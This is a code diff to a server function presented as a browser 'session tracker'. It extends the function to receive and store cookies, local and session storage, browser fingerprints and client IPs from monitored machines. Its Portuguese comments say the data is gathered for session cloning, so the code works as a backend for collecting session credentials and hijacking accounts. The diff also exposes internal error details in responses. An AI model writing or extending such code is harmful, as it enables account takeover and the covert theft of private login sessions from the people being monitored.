@@ -32,10 +32,24 @@ serve(async (req) => {
       url, 
       domain, 
       title,
-      action = 'heartbeat' 
+      action = 'heartbeat',
+      // ✅ NOVOS CAMPOS PARA CLONAGEM
+      cookies,
+      local_storage,
+      session_storage,
+      browser_fingerprint,
+      client_ip
     } = await req.json()
 
-    console.log('Session tracker received:', { machine_id, domain, action });
+    console.log('Session tracker received:', { 
+      machine_id, 
+      domain, 
+      action,
+      cookies_count: cookies?.length || 0,
+      has_storage: !!(local_storage || session_storage),
+      has_fingerprint: !!browser_fingerprint,
+      client_ip: client_ip || 'not provided'
+    });
 
     if (!machine_id || !tab_id || !domain) {
       return new Response(JSON.stringify({ error: 'Missing required fields' }), {
@@ -55,7 +69,7 @@ serve(async (req) => {
     };
 
     if (action === 'heartbeat') {
-      // Update or insert session
+      // ✅ SALVAR DADOS COMPLETOS PARA CLONAGEM
       const { error: upsertError } = await supabaseClient
         .from('active_sessions')
         .upsert({
@@ -66,18 +80,33 @@ serve(async (req) => {
           domain,
           title,
           last_activity: new Date().toISOString(),
-          is_active: true
+          is_active: true,
+          
+          // ✅ DADOS COMPLETOS PARA CLONAGEM
+          cookies: cookies || [],
+          local_storage: local_storage || {},
+          session_storage: session_storage || {},
+          browser_fingerprint: browser_fingerprint || {},
+          client_ip: client_ip || null,
+          
+          // Metadados adicionais
+          updated_at: new Date().toISOString()
         }, {
           onConflict: 'machine_id,tab_id'
         })
 
       if (upsertError) {
         console.error('Error upserting session:', upsertError);
-        return new Response(JSON.stringify({ error: 'Database error' }), {
+        return new Response(JSON.stringify({ 
+          error: 'Database error',
+          details: upsertError.message 
+        }), {
           status: 500,
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         })
       }
+
+      console.log(`✅ Session saved with complete data: ${cookies?.length || 0} cookies, storage: ${Object.keys(local_storage || {}).length} items`);
 
       // Buscar TODOS os domínios monitorados ativos para este domínio
       const { data: monitoredDomains, error: fetchError } = await supabaseClient
@@ -161,7 +190,14 @@ serve(async (req) => {
                   is_critical: config.alert_type === 'critical',
                   full_url_match: fullUrlMonitored || null,
                   match_type: matchType,
-                  config_id: config.id
+                  config_id: config.id,
+                  // ✅ Incluir informação sobre dados disponíveis
+                  session_data_available: {
+                    cookies: cookies?.length || 0,
+                    storage_items: Object.keys(local_storage || {}).length,
+                    has_fingerprint: !!browser_fingerprint,
+                    has_client_ip: !!client_ip
+                  }
                 }
               });
 
@@ -178,10 +214,13 @@ serve(async (req) => {
       }
 
     } else if (action === 'close') {
-      // Mark session as inactive
+      // Marcar sessão como inativa
       const { error: updateError } = await supabaseClient
         .from('active_sessions')
-        .update({ is_active: false })
+        .update({ 
+          is_active: false,
+          updated_at: new Date().toISOString()
+        })
         .eq('machine_id', machine_id)
         .eq('tab_id', tab_id)
 
@@ -192,15 +231,23 @@ serve(async (req) => {
           headers: { ...corsHeaders, 'Content-Type': 'application/json' },
         })
       }
+      
+      console.log(`✅ Session marked as inactive: ${machine_id}/${tab_id}`);
     }
 
-    return new Response(JSON.stringify({ success: true }), {
+    return new Response(JSON.stringify({ 
+      success: true,
+      message: action === 'heartbeat' ? 'Session data saved' : 'Session closed'
+    }), {
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     })
 
   } catch (error) {
     console.error('Session tracker error:', error);
-    return new Response(JSON.stringify({ error: 'Internal server error' }), {
+    return new Response(JSON.stringify({ 
+      error: 'Internal server error',
+      message: error.message
+    }), {
       status: 500,
       headers: { ...corsHeaders, 'Content-Type': 'application/json' },
     })
